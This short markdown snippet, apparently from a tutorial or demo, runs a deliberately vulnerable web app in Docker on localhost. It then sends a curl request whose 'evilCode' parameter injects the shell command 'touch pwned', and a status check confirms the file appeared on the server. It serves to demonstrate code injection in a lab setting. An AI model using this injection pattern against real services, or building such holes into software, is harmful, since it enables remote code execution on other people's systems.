### example 00 - vulnerable
```bash
$ docker build --tag host.example --file Dockerfile .
$ docker run -p 8020:3000 -d -t --name example host.example

# from another terminal
$ curl -X GET http://127.0.0.1:8020/status
Everything seems fine # <--- pwned file does not exist

$ curl -X POST http://127.0.0.1:8020/vuln?evilCode="\"touch%20pwned\""
I didn't do it # <--- oh yes he did !

$ curl -X GET http://127.0.0.1:8020/status
You've been pwned ! # <--- pwned file created on server
```